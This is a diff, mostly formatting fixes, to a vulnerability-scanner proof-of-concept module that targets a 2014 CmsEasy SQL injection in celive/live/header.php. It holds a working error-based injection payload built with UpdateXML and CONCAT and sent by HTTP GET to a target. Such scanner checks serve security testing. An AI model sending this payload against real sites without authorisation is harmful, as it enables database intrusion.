@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'CmsEasy_0013' # 平台漏洞编号，留空
+    vuln_id = 'CmsEasy_0013'  # 平台漏洞编号，留空
     name = 'CmsEasy SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-11-07'  # 漏洞公布时间
     desc = '''
         CmsEasy /cmseasy/celive/live/header.php?xajax=LiveMessage&xajaxargs 存在SQL注入漏。
@@ -31,7 +32,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/celive/live/header.php?xajax=LiveMessage&xajaxargs[0][phone]=\&xajaxargs[0][departmentid]=,(UpdateXML(1,CONCAT(0x5b,md5(c),0x5d),1)),6,7,8)%23"
             url = self.target + payload
             r = requests.get(url)
@@ -45,6 +46,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
